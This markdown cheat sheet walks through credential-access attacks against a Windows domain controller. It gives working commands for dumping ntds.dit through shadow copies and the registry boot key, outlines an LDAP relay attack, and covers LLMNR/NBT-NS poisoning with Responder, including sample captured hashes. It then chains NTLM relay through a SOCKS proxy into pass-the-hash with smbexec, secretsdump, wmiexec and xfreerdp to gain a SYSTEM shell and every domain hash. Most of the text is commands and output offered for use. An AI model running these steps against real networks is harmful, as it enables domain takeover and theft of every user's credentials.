# Windows DC Credential Access

***

## Dump the Ntds

```
vssadmin create shadow /for=c:
```

```
cmd /c copy \\?
\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit  .
```

```
• reg save HKLM\system system
• $key = Get-Bootkey -SystemHiveFilepath ..\ntds-temp\system
```

```
• esentutl.exe /p ntds.dit /!10240 /8 /o
```

```
• Get-ADDBAccount -All -DBpath ntds.dit -Bootkey $key
```

## LDAP Relay

LDAP Relay can be seen as the good old NTLM Relay with a twist. The third party host to which we will relay credentials will be the Domain Controller. LDAP Relay leverages the fact that signed Lightweight Directory Access Protocol (LDAP) binds are not required, by default 

The attacks lifecycle is the following: 

1. Identify a Domain Administrator’s workstation 
2. Become a man in the middle between his workstation and the gateway 
3. Inject a hidden link in the web traffic pointing to a HTTP listener that requests NTLM authentication 
4. Redirect the captured credentials to the DC 

#### Tools

    intercepter-ng 

## LLMNR & NBT- NS Poisoning

LLMNR and NBT-NS are both methods of resolving hostnames to IP addresses.If  DNs Resolve  fails, LLMNR will be reached followed by NetBIOS. LLMNR is the successor to NetBIOS.  LLMNR/NetBIOS request will be sent over multicast or broadcast respectively. 

#### Responder

```
git clone https://github.com/lgandx/Responder
```

```
Python3 responder -I eth0 -v
    SMB] NTLMv1-SSP Client   : ::ffff:192.168.1.43
    [SMB] NTLMv1-SSP Username : NOORANETSHIELD\administrator
    [SMB] NTLMv1-SSP Hash: administrator::NOORANETSHIELD:D5D8BEDA499EB29700000000000000000000000000000000:4E9EE934A1905554C7EEE4239845FC0D20E0ACCEFC2980B6:bcd1e1a4b3e6e3e5
```

### Abusing NTLM relay and PTH

* Identifying SMB Signing 
  
  ```
  crackmapexec smb --gen-relay-list nss-target.txt 192.168.1.0/24
  ```

* Capture credential and open socket on 1080 
  
  ```
  ntlmrelayx.py -socks -smb2support -tf nss_targets.txt
  >Socks ---> run after client connect to share
   SMB  192.168.1.40 NOORANETSHIELD/ADMINISTRATOR  TRUE   445 
  ```

* Config proxychain 
  
  ```
  Nano /etc/proxychains4.conf 
  Socks 127.0.0.1 1080
  ```

* Use LLNMNR poisoning 
  
  ```
  Nano /etc/red/Responder/Responder.conf 
      Smb = Off
      Http = Off
  Python3 responder -I eth0 -v
  ```

* Method to gain hash from network 
  
  ```
  Any system on network connect to server share 
  \\192.168.1.40
  Net use \\192.168.1.40\c$
  \\anyfakeaddress
  ```

* PTH and get system shell 
  
  ```
  proxychains4 -q smbexec.py NOORANETSHIELD/ADMINISTRATOR:administrator@192.168.1.40
      [!] Launching semi-interactive shell - Careful what you execute
      C:\Windows\system32>whoami
      nt authority\system
  ```

* Get All Ntlm hash from Domain 
  
  ```
  proxychains4 -q secretsdump.py NOORANETSHIELD/ADMINISTRATOR:administrator@192.168.1.40
  ```

* Dump  NTDS.dit 
  
  ```
  proxychains4 -q secretsdump.py -use-vss  NOORANETSHIELD/ADMINISTRATOR:administrator@192.168.1.40
  ```

* Pass the hash any user on domain 
  
  ```
  wmiexec.py -hashes '00000000000000000000000000000000:47bf8039a8506cd67c524a03ff84ba4e' administrator@192.168.1.40
  ```

* Remote Desktop with Pth
  
  ```
  xfreerdp /u:administrator /pth:47bf8039a8506cd67c524a03ff84ba4e /v:192.168.1.40
  ```